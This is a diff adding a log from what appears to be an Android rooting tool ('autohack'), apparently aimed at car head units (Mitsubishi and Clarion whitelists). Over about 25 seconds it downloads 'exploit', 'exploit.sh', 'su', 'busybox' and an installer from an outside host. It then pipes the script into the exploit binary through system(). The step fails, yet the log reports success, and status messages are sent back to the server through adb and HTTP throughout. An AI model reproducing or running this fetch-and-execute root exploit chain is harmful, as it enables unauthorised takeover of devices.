@@ -1,0 +1,561 @@
+Mon Feb 15 13:45:39 2021: Starting...
+Mon Feb 15 13:45:39 2021: Server: 47.75.14.109:80
+Mon Feb 15 13:45:39 2021: ==================================
+Mon Feb 15 13:45:39 2021: 47.75.14.109
+Mon Feb 15 13:45:39 2021: /root
+Mon Feb 15 13:45:39 2021: 
+Mon Feb 15 13:45:39 2021: exploit
+Mon Feb 15 13:45:39 2021: 0946993636
+Mon Feb 15 13:45:39 2021: 2
+Mon Feb 15 13:45:39 2021: Connected!
+Mon Feb 15 13:45:39 2021: Header:
+GET /root/error.php?key=0946993636&message=checking+su HTTP/1.0
+Host: 47.75.14.109
+Accept-Encoding: identity
+User-Agent: Mozilla/5.0 (Linux; U; Android 4.3; en-us;) AppleWebKit/534.30 (KHTML, like Geko) Version/4.0 Mobile Safari/534.30
+
+
+
+Mon Feb 15 13:45:40 2021: 
+..............
+Received header (224):
+HTTP/1.1 200 OK
+Date: Mon, 15 Feb 2021 13:45:38 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Vary: Host,Accept-Encoding
+Access-Control-Allow-Origin: *
+Content-Length: 188
+Connection: close
+Content-Type: text/html; charset=UTF-8
+..............
+Mon Feb 15 13:45:40 2021: http status: 200
+Mon Feb 15 13:45:40 2021: content-length: 188
+Mon Feb 15 13:45:40 2021: Total bytes written: 188
+Mon Feb 15 13:45:40 2021: download_file: file closed
+Mon Feb 15 13:45:40 2021: Connected!
+Mon Feb 15 13:45:40 2021: Header:
+GET /root/error.php?key=0946993636&message=downloading+exploit HTTP/1.0
+Host: 47.75.14.109
+Accept-Encoding: identity
+User-Agent: Mozilla/5.0 (Linux; U; Android 4.3; en-us;) AppleWebKit/534.30 (KHTML, like Geko) Version/4.0 Mobile Safari/534.30
+
+
+
+Mon Feb 15 13:45:41 2021: 
+..............
+Received header (224):
+HTTP/1.1 200 OK
+Date: Mon, 15 Feb 2021 13:45:40 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Vary: Host,Accept-Encoding
+Access-Control-Allow-Origin: *
+Content-Length: 196
+Connection: close
+Content-Type: text/html; charset=UTF-8
+..............
+Mon Feb 15 13:45:41 2021: http status: 200
+Mon Feb 15 13:45:41 2021: content-length: 196
+Mon Feb 15 13:45:41 2021: Total bytes written: 196
+Mon Feb 15 13:45:41 2021: download_file: file closed
+Mon Feb 15 13:45:41 2021: Connected!
+Mon Feb 15 13:45:41 2021: Header:
+GET /root/error.php?key=0946993636&message=exploit HTTP/1.0
+Host: 47.75.14.109
+Accept-Encoding: identity
+User-Agent: Mozilla/5.0 (Linux; U; Android 4.3; en-us;) AppleWebKit/534.30 (KHTML, like Geko) Version/4.0 Mobile Safari/534.30
+
+
+
+Mon Feb 15 13:45:42 2021: 
+..............
+Received header (224):
+HTTP/1.1 200 OK
+Date: Mon, 15 Feb 2021 13:45:41 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Vary: Host,Accept-Encoding
+Access-Control-Allow-Origin: *
+Content-Length: 184
+Connection: close
+Content-Type: text/html; charset=UTF-8
+..............
+Mon Feb 15 13:45:42 2021: http status: 200
+Mon Feb 15 13:45:42 2021: content-length: 184
+Mon Feb 15 13:45:42 2021: Total bytes written: 184
+Mon Feb 15 13:45:42 2021: download_file: file closed
+Mon Feb 15 13:45:42 2021: download exploit: attempt 1/5
+Mon Feb 15 13:45:42 2021: Connected!
+Mon Feb 15 13:45:42 2021: Header:
+GET /root/exploit HTTP/1.0
+Host: 47.75.14.109
+Accept-Encoding: identity
+User-Agent: Mozilla/5.0 (Linux; U; Android 4.3; en-us;) AppleWebKit/534.30 (KHTML, like Geko) Version/4.0 Mobile Safari/534.30
+
+
+
+Mon Feb 15 13:45:43 2021: 
+..............
+Received header (236):
+HTTP/1.1 200 OK
+Date: Mon, 15 Feb 2021 13:45:42 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Vary: Host
+Last-Modified: Wed, 11 Jul 2018 16:36:48 GMT
+ETag: "60d2c-570bbda5e1502"
+Accept-Ranges: bytes
+Content-Length: 396588
+Connection: close
+..............
+Mon Feb 15 13:45:43 2021: http status: 200
+Mon Feb 15 13:45:43 2021: content-length: 396588
+Mon Feb 15 13:45:44 2021: Total bytes written: 396588
+Mon Feb 15 13:45:44 2021: download_file: file closed
+Mon Feb 15 13:45:44 2021: Connected!
+Mon Feb 15 13:45:44 2021: Header:
+GET /root/error.php?key=0946993636&message=device.db HTTP/1.0
+Host: 47.75.14.109
+Accept-Encoding: identity
+User-Agent: Mozilla/5.0 (Linux; U; Android 4.3; en-us;) AppleWebKit/534.30 (KHTML, like Geko) Version/4.0 Mobile Safari/534.30
+
+
+
+Mon Feb 15 13:45:45 2021: 
+..............
+Received header (224):
+HTTP/1.1 200 OK
+Date: Mon, 15 Feb 2021 13:45:43 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Vary: Host,Accept-Encoding
+Access-Control-Allow-Origin: *
+Content-Length: 186
+Connection: close
+Content-Type: text/html; charset=UTF-8
+..............
+Mon Feb 15 13:45:45 2021: http status: 200
+Mon Feb 15 13:45:45 2021: content-length: 186
+Mon Feb 15 13:45:45 2021: Total bytes written: 186
+Mon Feb 15 13:45:45 2021: download_file: file closed
+Mon Feb 15 13:45:45 2021: download device.db: attempt 1/5
+Mon Feb 15 13:45:45 2021: Connected!
+Mon Feb 15 13:45:45 2021: Header:
+GET /root/device.db HTTP/1.0
+Host: 47.75.14.109
+Accept-Encoding: identity
+User-Agent: Mozilla/5.0 (Linux; U; Android 4.3; en-us;) AppleWebKit/534.30 (KHTML, like Geko) Version/4.0 Mobile Safari/534.30
+
+
+
+Mon Feb 15 13:45:45 2021: 
+..............
+Received header (235):
+HTTP/1.1 200 OK
+Date: Mon, 15 Feb 2021 13:45:45 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Vary: Host
+Last-Modified: Wed, 11 Jul 2018 16:36:53 GMT
+ETag: "15800-570bbdaaffdb6"
+Accept-Ranges: bytes
+Content-Length: 88064
+Connection: close
+..............
+Mon Feb 15 13:45:45 2021: http status: 200
+Mon Feb 15 13:45:45 2021: content-length: 88064
+Mon Feb 15 13:45:45 2021: Total bytes written: 88064
+Mon Feb 15 13:45:45 2021: download_file: file closed
+Mon Feb 15 13:45:45 2021: Connected!
+Mon Feb 15 13:45:45 2021: Header:
+GET /root/error.php?key=0946993636&message=installer HTTP/1.0
+Host: 47.75.14.109
+Accept-Encoding: identity
+User-Agent: Mozilla/5.0 (Linux; U; Android 4.3; en-us;) AppleWebKit/534.30 (KHTML, like Geko) Version/4.0 Mobile Safari/534.30
+
+
+
+Mon Feb 15 13:45:46 2021: 
+..............
+Received header (224):
+HTTP/1.1 200 OK
+Date: Mon, 15 Feb 2021 13:45:45 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Vary: Host,Accept-Encoding
+Access-Control-Allow-Origin: *
+Content-Length: 186
+Connection: close
+Content-Type: text/html; charset=UTF-8
+..............
+Mon Feb 15 13:45:46 2021: http status: 200
+Mon Feb 15 13:45:46 2021: content-length: 186
+Mon Feb 15 13:45:46 2021: Total bytes written: 186
+Mon Feb 15 13:45:46 2021: download_file: file closed
+Mon Feb 15 13:45:46 2021: download installer: attempt 1/5
+Mon Feb 15 13:45:47 2021: Connected!
+Mon Feb 15 13:45:47 2021: Header:
+GET /root/installer HTTP/1.0
+Host: 47.75.14.109
+Accept-Encoding: identity
+User-Agent: Mozilla/5.0 (Linux; U; Android 4.3; en-us;) AppleWebKit/534.30 (KHTML, like Geko) Version/4.0 Mobile Safari/534.30
+
+
+
+Mon Feb 15 13:45:47 2021: 
+..............
+Received header (238):
+HTTP/1.1 200 OK
+Date: Mon, 15 Feb 2021 13:45:46 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Vary: Host
+Last-Modified: Thu, 23 Apr 2020 06:23:56 GMT
+ETag: "2d992b-5a3ef4b1e2236"
+Accept-Ranges: bytes
+Content-Length: 2988331
+Connection: close
+..............
+Mon Feb 15 13:45:47 2021: http status: 200
+Mon Feb 15 13:45:47 2021: content-length: 2988331
+Mon Feb 15 13:45:53 2021: Total bytes written: 2988331
+Mon Feb 15 13:45:53 2021: download_file: file closed
+Mon Feb 15 13:45:53 2021: Connected!
+Mon Feb 15 13:45:53 2021: Header:
+GET /root/error.php?key=0946993636&message=whitelist_mitsubishi.xml HTTP/1.0
+Host: 47.75.14.109
+Accept-Encoding: identity
+User-Agent: Mozilla/5.0 (Linux; U; Android 4.3; en-us;) AppleWebKit/534.30 (KHTML, like Geko) Version/4.0 Mobile Safari/534.30
+
+
+
+Mon Feb 15 13:45:55 2021: 
+..............
+Received header (224):
+HTTP/1.1 200 OK
+Date: Mon, 15 Feb 2021 13:45:53 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Vary: Host,Accept-Encoding
+Access-Control-Allow-Origin: *
+Content-Length: 201
+Connection: close
+Content-Type: text/html; charset=UTF-8
+..............
+Mon Feb 15 13:45:55 2021: http status: 200
+Mon Feb 15 13:45:55 2021: content-length: 201
+Mon Feb 15 13:45:55 2021: Total bytes written: 201
+Mon Feb 15 13:45:55 2021: download_file: file closed
+Mon Feb 15 13:45:55 2021: download whitelist_mitsubishi.xml: attempt 1/5
+Mon Feb 15 13:45:55 2021: Connected!
+Mon Feb 15 13:45:55 2021: Header:
+GET /root/whitelist_mitsubishi.xml HTTP/1.0
+Host: 47.75.14.109
+Accept-Encoding: identity
+User-Agent: Mozilla/5.0 (Linux; U; Android 4.3; en-us;) AppleWebKit/534.30 (KHTML, like Geko) Version/4.0 Mobile Safari/534.30
+
+
+
+Mon Feb 15 13:45:55 2021: 
+..............
+Received header (281):
+HTTP/1.1 200 OK
+Date: Mon, 15 Feb 2021 13:45:54 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Vary: Host,Accept-Encoding
+Last-Modified: Wed, 11 Jul 2018 16:36:52 GMT
+ETag: "7c9c-570bbda97e1d9"
+Accept-Ranges: bytes
+Content-Length: 31900
+Connection: close
+Content-Type: application/xml
+..............
+Mon Feb 15 13:45:55 2021: http status: 200
+Mon Feb 15 13:45:55 2021: content-length: 31900
+Mon Feb 15 13:45:55 2021: Total bytes written: 31900
+Mon Feb 15 13:45:55 2021: download_file: file closed
+Mon Feb 15 13:45:55 2021: Connected!
+Mon Feb 15 13:45:55 2021: Header:
+GET /root/error.php?key=0946993636&message=whitelist_clarion.xml HTTP/1.0
+Host: 47.75.14.109
+Accept-Encoding: identity
+User-Agent: Mozilla/5.0 (Linux; U; Android 4.3; en-us;) AppleWebKit/534.30 (KHTML, like Geko) Version/4.0 Mobile Safari/534.30
+
+
+
+Mon Feb 15 13:45:56 2021: 
+..............
+Received header (224):
+HTTP/1.1 200 OK
+Date: Mon, 15 Feb 2021 13:45:54 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Vary: Host,Accept-Encoding
+Access-Control-Allow-Origin: *
+Content-Length: 198
+Connection: close
+Content-Type: text/html; charset=UTF-8
+..............
+Mon Feb 15 13:45:56 2021: http status: 200
+Mon Feb 15 13:45:56 2021: content-length: 198
+Mon Feb 15 13:45:56 2021: Total bytes written: 198
+Mon Feb 15 13:45:56 2021: download_file: file closed
+Mon Feb 15 13:45:56 2021: download whitelist_clarion.xml: attempt 1/5
+Mon Feb 15 13:45:56 2021: Connected!
+Mon Feb 15 13:45:56 2021: Header:
+GET /root/whitelist_clarion.xml HTTP/1.0
+Host: 47.75.14.109
+Accept-Encoding: identity
+User-Agent: Mozilla/5.0 (Linux; U; Android 4.3; en-us;) AppleWebKit/534.30 (KHTML, like Geko) Version/4.0 Mobile Safari/534.30
+
+
+
+Mon Feb 15 13:45:56 2021: 
+..............
+Received header (281):
+HTTP/1.1 200 OK
+Date: Mon, 15 Feb 2021 13:45:56 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Vary: Host,Accept-Encoding
+Last-Modified: Wed, 11 Jul 2018 16:36:47 GMT
+ETag: "67ec-570bbda5143c4"
+Accept-Ranges: bytes
+Content-Length: 26604
+Connection: close
+Content-Type: application/xml
+..............
+Mon Feb 15 13:45:56 2021: http status: 200
+Mon Feb 15 13:45:56 2021: content-length: 26604
+Mon Feb 15 13:45:56 2021: Total bytes written: 26604
+Mon Feb 15 13:45:56 2021: download_file: file closed
+Mon Feb 15 13:45:56 2021: Connected!
+Mon Feb 15 13:45:56 2021: Header:
+GET /root/error.php?key=0946993636&message=exploit.sh HTTP/1.0
+Host: 47.75.14.109
+Accept-Encoding: identity
+User-Agent: Mozilla/5.0 (Linux; U; Android 4.3; en-us;) AppleWebKit/534.30 (KHTML, like Geko) Version/4.0 Mobile Safari/534.30
+
+
+
+Mon Feb 15 13:45:57 2021: 
+..............
+Received header (224):
+HTTP/1.1 200 OK
+Date: Mon, 15 Feb 2021 13:45:56 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Vary: Host,Accept-Encoding
+Access-Control-Allow-Origin: *
+Content-Length: 187
+Connection: close
+Content-Type: text/html; charset=UTF-8
+..............
+Mon Feb 15 13:45:57 2021: http status: 200
+Mon Feb 15 13:45:57 2021: content-length: 187
+Mon Feb 15 13:45:57 2021: Total bytes written: 187
+Mon Feb 15 13:45:57 2021: download_file: file closed
+Mon Feb 15 13:45:57 2021: download exploit.sh: attempt 1/5
+Mon Feb 15 13:45:57 2021: Connected!
+Mon Feb 15 13:45:57 2021: Header:
+GET /root/exploit.sh HTTP/1.0
+Host: 47.75.14.109
+Accept-Encoding: identity
+User-Agent: Mozilla/5.0 (Linux; U; Android 4.3; en-us;) AppleWebKit/534.30 (KHTML, like Geko) Version/4.0 Mobile Safari/534.30
+
+
+
+Mon Feb 15 13:45:57 2021: 
+..............
+Received header (256):
+HTTP/1.1 200 OK
+Date: Mon, 15 Feb 2021 13:45:57 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Vary: Host
+Last-Modified: Wed, 17 Oct 2018 08:04:15 GMT
+ETag: "2dc-578681dd4e2e5"
+Accept-Ranges: bytes
+Content-Length: 732
+Connection: close
+Content-Type: text/x-sh
+..............
+Mon Feb 15 13:45:57 2021: http status: 200
+Mon Feb 15 13:45:57 2021: content-length: 732
+Mon Feb 15 13:45:57 2021: Total bytes written: 732
+Mon Feb 15 13:45:57 2021: download_file: file closed
+Mon Feb 15 13:45:57 2021: Connected!
+Mon Feb 15 13:45:57 2021: Header:
+GET /root/error.php?key=0946993636&message=su HTTP/1.0
+Host: 47.75.14.109
+Accept-Encoding: identity
+User-Agent: Mozilla/5.0 (Linux; U; Android 4.3; en-us;) AppleWebKit/534.30 (KHTML, like Geko) Version/4.0 Mobile Safari/534.30
+
+
+
+Mon Feb 15 13:45:58 2021: 
+..............
+Received header (224):
+HTTP/1.1 200 OK
+Date: Mon, 15 Feb 2021 13:45:57 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Vary: Host,Accept-Encoding
+Access-Control-Allow-Origin: *
+Content-Length: 179
+Connection: close
+Content-Type: text/html; charset=UTF-8
+..............
+Mon Feb 15 13:45:58 2021: http status: 200
+Mon Feb 15 13:45:58 2021: content-length: 179
+Mon Feb 15 13:45:58 2021: Total bytes written: 179
+Mon Feb 15 13:45:58 2021: download_file: file closed
+Mon Feb 15 13:45:58 2021: download su: attempt 1/5
+Mon Feb 15 13:45:59 2021: Connected!
+Mon Feb 15 13:45:59 2021: Header:
+GET /root/su HTTP/1.0
+Host: 47.75.14.109
+Accept-Encoding: identity
+User-Agent: Mozilla/5.0 (Linux; U; Android 4.3; en-us;) AppleWebKit/534.30 (KHTML, like Geko) Version/4.0 Mobile Safari/534.30
+
+
+
+Mon Feb 15 13:45:59 2021: 
+..............
+Received header (235):
+HTTP/1.1 200 OK
+Date: Mon, 15 Feb 2021 13:45:58 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Vary: Host
+Last-Modified: Wed, 11 Jul 2018 16:36:51 GMT
+ETag: "12654-570bbda889f9c"
+Accept-Ranges: bytes
+Content-Length: 75348
+Connection: close
+..............
+Mon Feb 15 13:45:59 2021: http status: 200
+Mon Feb 15 13:45:59 2021: content-length: 75348
+Mon Feb 15 13:45:59 2021: Total bytes written: 75348
+Mon Feb 15 13:45:59 2021: download_file: file closed
+Mon Feb 15 13:45:59 2021: Connected!
+Mon Feb 15 13:45:59 2021: Header:
+GET /root/error.php?key=0946993636&message=busybox HTTP/1.0
+Host: 47.75.14.109
+Accept-Encoding: identity
+User-Agent: Mozilla/5.0 (Linux; U; Android 4.3; en-us;) AppleWebKit/534.30 (KHTML, like Geko) Version/4.0 Mobile Safari/534.30
+
+
+
+Mon Feb 15 13:46:00 2021: 
+..............
+Received header (224):
+HTTP/1.1 200 OK
+Date: Mon, 15 Feb 2021 13:45:58 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Vary: Host,Accept-Encoding
+Access-Control-Allow-Origin: *
+Content-Length: 184
+Connection: close
+Content-Type: text/html; charset=UTF-8
+..............
+Mon Feb 15 13:46:00 2021: http status: 200
+Mon Feb 15 13:46:00 2021: content-length: 184
+Mon Feb 15 13:46:00 2021: Total bytes written: 184
+Mon Feb 15 13:46:00 2021: download_file: file closed
+Mon Feb 15 13:46:00 2021: download busybox: attempt 1/5
+Mon Feb 15 13:46:00 2021: Connected!
+Mon Feb 15 13:46:00 2021: Header:
+GET /root/busybox HTTP/1.0
+Host: 47.75.14.109
+Accept-Encoding: identity
+User-Agent: Mozilla/5.0 (Linux; U; Android 4.3; en-us;) AppleWebKit/534.30 (KHTML, like Geko) Version/4.0 Mobile Safari/534.30
+
+
+
+Mon Feb 15 13:46:00 2021: 
+..............
+Received header (238):
+HTTP/1.1 200 OK
+Date: Mon, 15 Feb 2021 13:46:00 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Vary: Host
+Last-Modified: Wed, 11 Jul 2018 16:36:50 GMT
+ETag: "119a9c-570bbda843a9c"
+Accept-Ranges: bytes
+Content-Length: 1153692
+Connection: close
+..............
+Mon Feb 15 13:46:00 2021: http status: 200
+Mon Feb 15 13:46:00 2021: content-length: 1153692
+Mon Feb 15 13:46:02 2021: Total bytes written: 1153692
+Mon Feb 15 13:46:02 2021: download_file: file closed
+Mon Feb 15 13:46:02 2021: Connected!
+Mon Feb 15 13:46:02 2021: Header:
+GET /root/error.php?key=0946993636&message=exploiting HTTP/1.0
+Host: 47.75.14.109
+Accept-Encoding: identity
+User-Agent: Mozilla/5.0 (Linux; U; Android 4.3; en-us;) AppleWebKit/534.30 (KHTML, like Geko) Version/4.0 Mobile Safari/534.30
+
+
+
+Mon Feb 15 13:46:03 2021: 
+..............
+Received header (224):
+HTTP/1.1 200 OK
+Date: Mon, 15 Feb 2021 13:46:01 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Vary: Host,Accept-Encoding
+Access-Control-Allow-Origin: *
+Content-Length: 187
+Connection: close
+Content-Type: text/html; charset=UTF-8
+..............
+Mon Feb 15 13:46:03 2021: http status: 200
+Mon Feb 15 13:46:03 2021: content-length: 187
+Mon Feb 15 13:46:03 2021: Total bytes written: 187
+Mon Feb 15 13:46:03 2021: download_file: file closed
+Mon Feb 15 13:46:03 2021: system('echo '/data/local/tmp/autohack/exploit.sh 47.75.14.109 /root 0946993636 ' | /data/local/tmp/autohack/exploit')...
+Mon Feb 15 13:46:03 2021: system() returned exit status 1
+Mon Feb 15 13:46:03 2021: WARNING: system() did not complete successfully (1).
+Mon Feb 15 13:46:03 2021: Connected!
+Mon Feb 15 13:46:03 2021: Header:
+GET /root/error.php?key=0946993636&message=WARNING%3a+system%28%29+did+not+complete+successfully+%281%29. HTTP/1.0
+Host: 47.75.14.109
+Accept-Encoding: identity
+User-Agent: Mozilla/5.0 (Linux; U; Android 4.3; en-us;) AppleWebKit/534.30 (KHTML, like Geko) Version/4.0 Mobile Safari/534.30
+
+
+
+Mon Feb 15 13:46:04 2021: 
+..............
+Received header (224):
+HTTP/1.1 200 OK
+Date: Mon, 15 Feb 2021 13:46:03 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Vary: Host,Accept-Encoding
+Access-Control-Allow-Origin: *
+Content-Length: 229
+Connection: close
+Content-Type: text/html; charset=UTF-8
+..............
+Mon Feb 15 13:46:04 2021: http status: 200
+Mon Feb 15 13:46:04 2021: content-length: 229
+Mon Feb 15 13:46:04 2021: Total bytes written: 229
+Mon Feb 15 13:46:04 2021: download_file: file closed
+Mon Feb 15 13:46:04 2021: system('adb connect 127.0.0.1; adb -s 127.0.0.1:5555 shell am start -a android.intent.action.VIEW -d 'http://47.75.14.109/root/error.php?key=0946993636&message=WARNING: system() did not complete successfully (1).'')...
+Mon Feb 15 13:46:04 2021: Connected!
+Mon Feb 15 13:46:04 2021: Header:
+GET /root/error.php?key=0946993636&message=succeeded HTTP/1.0
+Host: 47.75.14.109
+Accept-Encoding: identity
+User-Agent: Mozilla/5.0 (Linux; U; Android 4.3; en-us;) AppleWebKit/534.30 (KHTML, like Geko) Version/4.0 Mobile Safari/534.30
+
+
+
+Mon Feb 15 13:46:05 2021: 
+..............
+Received header (224):
+HTTP/1.1 200 OK
+Date: Mon, 15 Feb 2021 13:46:04 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Vary: Host,Accept-Encoding
+Access-Control-Allow-Origin: *
+Content-Length: 186
+Connection: close
+Content-Type: text/html; charset=UTF-8
+..............
+Mon Feb 15 13:46:05 2021: http status: 200
+Mon Feb 15 13:46:05 2021: content-length: 186
+Mon Feb 15 13:46:05 2021: Total bytes written: 186
+Mon Feb 15 13:46:05 2021: download_file: file closed
+Mon Feb 15 13:46:05 2021: DONE :) exploit executed.
+Mon Feb 15 13:46:05 2021: Starting cleanup ...
+Mon Feb 15 13:46:05 2021: Goodbye!
+Mon Feb 15 13:46:05 2021: ------------------
